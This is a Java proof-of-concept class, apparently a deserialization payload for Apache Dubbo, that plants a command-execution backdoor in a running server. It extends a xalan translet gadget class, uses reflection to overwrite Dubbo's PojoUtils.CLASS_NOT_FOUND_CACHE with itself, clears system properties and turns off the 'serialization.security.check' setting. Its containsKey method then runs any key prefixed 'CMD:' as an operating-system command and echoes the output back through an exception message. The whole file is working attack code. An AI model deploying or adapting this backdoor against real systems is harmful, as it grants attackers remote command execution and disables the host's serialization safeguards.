package poc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.dubbo.common.utils.PojoUtils;


import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;

public class evilClass extends AbstractTranslet  implements ConcurrentMap<Object, Object> {
    private final ConcurrentHashMap<Object, Object> m = new ConcurrentHashMap<>();
    public static final String CMD_PREFIX = "CMD:";
    public static final String CMD_SPLIT = "@cmdEcho@";


    @Override
    public Object putIfAbsent(Object key, Object value) {
        return m.putIfAbsent(key,value);
    }

    @Override
    public boolean remove(Object key, Object value) {
        return m.remove(key,value);
    }

    @Override
    public boolean replace(Object key, Object oldValue, Object newValue) {
        return m.replace(key,oldValue,newValue);
    }

    @Override
    public Object replace(Object key, Object value) {
        return m.replace(key,value);
    }

    @Override
    public int size() {
        return m.size();
    }

    @Override
    public boolean isEmpty() {
        return m.isEmpty();
    }

    @Override
    public boolean containsKey(Object key) {
        StringBuilder b = new StringBuilder();
        if (key.toString().startsWith(CMD_PREFIX)) {
            b.append(CMD_SPLIT);
            try {
                Process p = Runtime.getRuntime().exec(key.toString().substring(5).split(" "));
                InputStream fis = p.getInputStream();
                InputStreamReader isr;
                if (key.toString().charAt(4) == 'g') {
                    isr = new InputStreamReader(fis, Charset.forName("GBK"));
                } else {
                    isr = new InputStreamReader(fis);
                }
                BufferedReader br = new BufferedReader(isr);
                String line;
                while ((line = br.readLine()) != null) {
                    b.append(line).append("\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            b.append(CMD_SPLIT);
            throw new IllegalArgumentException(b.toString());
        }
        return m.containsKey(key);

    }

    @Override
    public boolean containsValue(Object value) {
        return m.containsValue(value);
    }

    @Override
    public Object get(Object key) {

        return m.get(key);
    }

    @Override
    public Object put(Object key, Object value) {
        return m.put(key,value);
    }

    @Override
    public Object remove(Object key) {
        return m.remove(key);
    }

    @Override
    public void putAll(Map<?, ?> ma) {
        m.putAll(ma);

    }

    @Override
    public void clear() {
        m.clear();

    }

    @Override
    public Set<Object> keySet() {
        return m.keySet();
    }

    @Override
    public Collection<Object> values() {
        return m.values();
    }

    @Override
    public Set<Entry<Object, Object>> entrySet() {
        return m.entrySet();
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public evilClass(String a) throws Exception{

    }
    public evilClass() throws Exception{
        try {
            addClass();
        }catch (Exception e){
            e.printStackTrace();
        }
    }



    public static void addClass() throws Exception{
        System.out.println("insert success");
        Field mo = Field.class.getDeclaredField("modifiers");
        mo.setAccessible(true);
        Field field = PojoUtils.class.getDeclaredField("CLASS_NOT_FOUND_CACHE");
        field.setAccessible(true);
        mo.setInt(field,field.getModifiers()&~Modifier.FINAL);
        field.set(null,new poc.evilClass(""));
        System.setProperties(null);
        System.setProperty("serialization.security.check","false");
        System.out.println("add success");
    }

    public static void main(String[] args) throws Exception{

    }

}